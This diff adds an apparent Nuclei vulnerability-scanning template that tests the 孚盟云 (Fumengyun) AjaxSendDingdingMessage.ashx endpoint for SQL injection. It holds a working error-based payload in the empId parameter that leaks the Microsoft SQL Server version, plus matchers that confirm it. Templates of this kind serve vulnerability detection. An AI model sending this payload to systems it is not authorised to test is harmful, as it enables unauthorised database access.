@@ -1,0 +1,28 @@
+id: poc-yaml-fumengyun-ajaxmethod-ashx-psot-sqli
+info:
+  name: 孚盟云 AjaxMethod.ashx-post SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 孚盟云's AjaxMethod.ashx endpoint.
+
+http:
+  - raw:
+      - |
+        POST /m/Dingding/Ajax/AjaxSendDingdingMessage.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=SendDingMeg_Mail&empId=2'+and+1=@@version--+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "nvarchar"
+          - "Windows"
